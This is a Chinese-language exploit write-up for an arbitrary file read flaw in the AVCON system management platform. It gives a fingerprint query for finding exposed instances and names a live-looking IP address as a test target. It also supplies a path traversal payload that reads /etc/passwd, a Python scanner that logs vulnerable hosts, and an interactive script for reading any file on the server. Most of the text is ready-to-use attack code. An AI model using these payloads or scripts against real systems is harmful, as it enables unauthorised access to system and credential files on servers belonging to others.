## 一、资产搜索

```
title="AVCON-系统管理平台"
```

## 二、网站测试

```
http://124.128.82.98:8082
```

## 三、验证漏洞

payload

```
/download.action?filename=../../../../../../../../etc/passwd
```

![image-20240914112207843](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914112207843.png)

## 四、POC

```
def poc(target):
    payload = "/download.action?filename=../../../../../../../../etc/passwd"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}\n")
                    f.close()
                    print(f"[+]{target}存在任意文件读取漏洞")
                    return True
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        cmd = input("请输入要查看的文件，从/目录开始，q退出\n>>>>>>>>>>>>>>>>>>>")
        if cmd == 'q':
            exit(0)
        payload = "/download.action?filename=../../../../../../../.."
        try:
            res3 = requests.get(url=target + payload +cmd, verify=False, timeout=5)
            if res3.text != "":
                print(res3.text)
            else:
                print("文件不存在，请重新输入")
        except Exception as e:
            print(e)
```

## 六、测试结果

![image-20240914112530531](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914112530531.png)

![image-20240914113318011](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914113318011.png)

![image-20240914112418674](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914112418674.png)

